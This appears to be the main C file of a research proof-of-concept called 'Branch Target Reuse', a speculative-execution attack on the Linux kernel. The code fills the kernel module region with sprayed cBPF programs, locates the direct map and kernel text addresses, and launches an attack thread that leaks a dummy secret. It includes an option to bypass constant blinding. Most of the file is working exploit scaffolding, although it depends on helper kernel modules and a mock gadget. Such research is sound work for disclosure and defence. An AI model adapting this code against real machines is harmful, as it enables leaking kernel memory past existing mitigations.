/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>
#include <sys/time.h>


#include "common.h"
#include "targets.h"
#include "flush_and_reload.h"
#include "cbpf.h"
#include "collide_branch.h"
#include "modules_orcale.h"
#include "l3_eviction.h"

#include "../../../common/l2_eviction/evict_l2.h"
#include "../../../common/kaslr_prefetch/kaslr_prefetch.h"



#define TEST_ITERATIONS 10000


uint8_t * get_phys_map_start() {

    int fd;
    char buf[18];
    uint8_t * address;

    if (access(PATH_PHYS_MAP, F_OK) == 0) {
        fd = open(PATH_PHYS_MAP, O_RDONLY);
        assert(fd);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_PHYS_MAP);
        exit(EXIT_FAILURE);
    }

    assert(read(fd, buf, 18));

    assert(sscanf(buf, "%lx", (uint64_t *) &address) == 1);

    close(fd);

    return address;

}

void initialize_victim_region_addresses(struct config * cfg) {

    if (cfg->constant_blind_safe == 0) {
        cfg->debug_gadget_address = read_uint64_from_file(PATH_MOCK_GADGET);
        cfg->secret_address_offset = SECRET_ADDRESS_OFFSET_DEFAULT;
    } else {
        cfg->debug_gadget_address = read_uint64_from_file(PATH_MOCK_GADGET_CB);
        cfg->secret_address_offset = SECRET_ADDRESS_OFFSET_CONSTANT_BLIND;
    }
    cfg->target_gadget_32 = cfg->debug_gadget_address & 0xffffffff;
    cfg->init_task_p = (uint64_t) cfg->text_start + INIT_TASK_OFFSET;

    printf("%20s: %#18lx\n", "Mock gadget", cfg->debug_gadget_address );
    // printf("%20s: %#18lx\n", "init_task *", cfg->init_task_p);

    return;

}


// To goal is to allocate enough cBPF programs such that the next program
// will be allocated in our targeted address
int fill_module_region_gaps(struct config * cfg) {

    uint64_t new_module, next_program_addr;
    uint64_t prev_module = find_last_mapped_module_address();

    uint64_t i = 0;
    uint64_t offset = 0;

    printf("------------------------------------------------------\n");

    printf("[-] %20s: %#18lx\n", "Old last mapped module region", prev_module);
    printf("[+] Filling up gaps...\n");

    // lets reserve 2MB at the start to fill some holes
    // fork_reserve_n_bytes((1024 * 1024 * 2));
    usleep(1000);

    prev_module = find_last_mapped_module_address();

    printf("[-] %20s: %#18lx\n", "New last mapped module region", prev_module);

    printf("--> We insert 4k programs until a new 2MB chunk is allocated\n");

    for (size_t i = 0; i < 10; i++)
    {
        fork_insert_allow_all_prog(100);
    }

    new_module = find_last_mapped_module_address();

    printf("[-] %20s: %#18lx\n", "New last mapped module region", new_module);
    printf("[+] Reserved in total %lu pages (Size %luK) before new 2MB chunk was allocated\n", i, i * 4);

    next_program_addr = new_module - HUGE_PAGE_SIZE + 0x1000;

    printf("--> Next program will be allocated at %#18lx\n", next_program_addr);

    return 0;

}


// ----------------------------------------------------------------------------
// MAIN
//
// ----------------------------------------------------------------------------


void open_fds(struct config * cfg) {

    if (access(PATH_GET_AND_SET_FILTER_STRUCT, F_OK) == 0) {
        cfg->fd_get_filter_struct = open(PATH_GET_AND_SET_FILTER_STRUCT, O_RDONLY);
        assert(cfg->fd_get_filter_struct);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_GET_AND_SET_FILTER_STRUCT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_EVICT_FILTER_STRUCT, F_OK) == 0) {
        cfg->fd_evict = open(PATH_EVICT_FILTER_STRUCT, O_RDONLY);
        assert(cfg->fd_evict);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_EVICT_FILTER_STRUCT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_GET_AND_SET_PROG_STRUCT, F_OK) == 0) {
        cfg->fd_get_prog_struct = open(PATH_GET_AND_SET_PROG_STRUCT, O_RDONLY);
        assert(cfg->fd_get_prog_struct);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_GET_AND_SET_PROG_STRUCT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_EVICT_PROG_STRUCT, F_OK) == 0) {
        cfg->fd_evict_prog = open(PATH_EVICT_PROG_STRUCT, O_RDONLY);
        assert(cfg->fd_evict_prog);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_EVICT_PROG_STRUCT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_TIME_PROG_STRUCT, F_OK) == 0) {
        cfg->fd_time_prog = open(PATH_TIME_PROG_STRUCT, O_RDONLY);
        assert(cfg->fd_time_prog);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_TIME_PROG_STRUCT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_GET_AND_SET_FILTER_ENTRY_POINT, F_OK) == 0) {
        cfg->fd_get_entry_point = open(PATH_GET_AND_SET_FILTER_ENTRY_POINT, O_RDONLY);
        assert(cfg->fd_get_entry_point);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_GET_AND_SET_FILTER_ENTRY_POINT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_READ_BYTES_OLD_ENTRY_POINT, F_OK) == 0) {
        cfg->fd_read_entry_point = open(PATH_READ_BYTES_OLD_ENTRY_POINT, O_RDONLY);
        assert(cfg->fd_read_entry_point);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_READ_BYTES_OLD_ENTRY_POINT);
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char **argv)
{
    struct config cfg = {0};
    uint64_t time_start;
    int opt;
    pthread_t tid;
    void *status;
    cfg.use_proc_map = 1;

     while ((opt = getopt(argc, argv, "c")) != -1) {
        switch (opt) {
            case 'c': cfg.constant_blind_safe = 1; break;
            default:
                printf("Usage:\n"
                "%s {test_leakage_rate, test_reuse_rate, leak_dummy} [options]\n"
                    "  -c                 Bypass constant-blind\n"
                    , argv[0]);
                exit(1);
        }
    }


    if (optind < argc) {

        if(strcmp(argv[optind], "test_leakage_rate") == 0) {
            cfg.leak_mode = 0;
        } else if(strcmp(argv[optind], "test_reuse_rate") == 0) {
            cfg.leak_mode = 1;
        } else if(strcmp(argv[optind], "leak_dummy") == 0) {
            cfg.leak_mode = 2;
        } else {
            printf("Invalid leakage mode, choose between: \n- test_leakage_rate \n- test_reuse_rate \n- leak_dummy\n");
            exit(0);
        }
    }

    switch (cfg.leak_mode) {
    case 0:
        printf("Testing the leakage rate\n");
        break;
    case 1:
        printf("Testing reuse rate\n");
        break;
    case 2:
        printf("Leaking a dummy secret\n");
        break;
    default:
        break;
    }


    printf("================== ENVIRONMENT INFO ===================\n");

    (system("lscpu | grep '^Model name' | awk '{$1=$1}1'") + 1);
    (system("echo -n 'Linux version: ' && uname -r") + 1);
    (system("echo 'Linux spectre_v2 mitigation info:' && echo -n '- ' && cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 | cut -d' ' -f2-") + 1);

    int seed = time(0);
    // printf("Seed: %d\n", seed);
    srand(seed);

    // ------------------------------------------------------------------------
    // Setup buffers + fd's


    initialize_cbpf(cfg.constant_blind_safe);

    // ------------------------------------------------------------------------
    // We pin to idle core

    pin_to_core(IDLE_CORE);

    open_fds(&cfg);

    // ------------------------------------------------------------------------
    // Allocate a huge page

    cfg.phys_start  =  get_phys_map_start();
    printf("======================== Setup ========================\n");
    printf("%20s: %#18lx\n", "Direct Map Start", (uint64_t) cfg.phys_start);
    // if we run sudo anyways, we just do a double check
    assert(cfg.phys_start  ==  get_phys_map_start());

    uint64_t mem_total = get_mem_total();
    cfg.phys_end = cfg.phys_start + mem_total + (1LU << 30) + (uint64_t) (mem_total * 0.2);

    cfg.text_start = (uint8_t *) find_text_map_start();
    printf("%20s: %#18lx\n", "Kernel Text Start", (uint64_t) cfg.text_start);

    initialize_victim_region_addresses(&cfg);

#ifndef DEBUG_VM
    fill_module_region_gaps(&cfg);
#endif
    // ------------------------------------------------------------------------
    // Find the kernel address of our huge page

    cfg.ind_map = allocate_huge_page();

    pthread_create(&tid, NULL, thread_perform_attack, (void *)&cfg);
    usleep(10);
    pthread_create(&tid, NULL, thread_controller, (void *)&cfg);
    pthread_join(tid, &status);

    printf("Done!\n");

    kill(0, SIGQUIT);

}
